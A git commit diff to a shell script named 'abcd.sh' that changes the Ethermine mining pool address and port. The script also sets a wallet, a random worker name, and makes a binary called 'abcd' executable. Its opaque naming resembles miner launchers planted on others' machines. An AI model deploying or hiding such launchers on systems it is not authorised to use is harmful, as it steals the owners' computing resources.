2779f4b3e6169b0f48cd52d7f45413dc3427464e
pruabhi0 <87109060+pruabhi0@users.noreply.github.com>
2021-08-22 10:57:05 +0530

    Update abcd.sh

--- abcd.sh
+++ abcd.sh
@@ -2,7 +2,7 @@
 
 
 #!/bin/bash
-POOL=eu1.ethermine.org:5555
+POOL=us1.ethermine.org:4444
 WALLET=0x3588297c18119fE13b2E1B8B5894dB4dbdb03F1E
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-abhi)
 chmod +x abcd
